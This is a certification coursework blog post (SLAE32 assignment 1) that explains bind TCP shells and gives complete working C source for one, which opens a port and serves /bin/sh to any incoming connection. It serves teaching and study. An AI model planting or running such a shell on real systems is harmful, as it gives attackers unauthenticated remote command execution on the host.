---
title: SLAE32 - Assignment#1 [Bind TCP Shell]
author: bigb0ss
date: 2020-12-12 13:26:00 +0800
categories: [SLAE32]
tags: [slae32, assembly, x86, Bind TCP Shell]
image: /assets/img/post/slae32/slae32.png
---

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-1542

# Assignement #1 
* Create a Shell_Bind_TCP shellcode
	- Binds to a port
	- Execs Shell on incoming connection

* Port number should be easily configurable


# What is a Bind Shell?
Bind TCP opens up a port on the victim system. If an attacker could exploit a vulnerability on the victim system, she can implant a bind shell and connect to it from the remote attaking box. However, due to a firewall and detection controls, reverse TCP shell is preferrable over bind TCP shell thesedays.

![image](/assets/img/post/slae32/assignment1/01.png)

# Bind TCP Shell in C
Before creating our Bind TCP Shell in shellcode, we need to understand the Socket Programming. 

> **NOTE**: Socket programming is a way of connecting two nodes on a network to communicate with each other. 



let's better understand the Bind TCP in a higher programming language. We will use `C`:

```c++
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{

	int resultfd, sockfd;
	int port = 11111;
	struct sockaddr_in my_addr;

	// syscall 102
	// int socketcall(int call, unsigned long *args);

	// sycall socketcall (sys_socket 1)
	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	// syscall socketcall (sys_setsockopt 14)
        int one = 1;
        setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

	// set struct values
	my_addr.sin_family = AF_INET; // 2
	my_addr.sin_port = htons(port);
	my_addr.sin_addr.s_addr = INADDR_ANY;

	// syscall socketcall (sys_bind 2)
	bind(sockfd, (struct sockaddr *) &my_addr, sizeof(my_addr));

	// syscall socketcall (sys_listen 4)
	listen(sockfd, 0);

	// syscall socketcall (sys_accept 5)
	resultfd = accept(sockfd, NULL, NULL);

	// syscall 63
	dup2(resultfd, 2);
	dup2(resultfd, 1);
	dup2(resultfd, 0);

	// syscall 11
	execve("/bin/sh", NULL, NULL);

	return 0;
}
```




















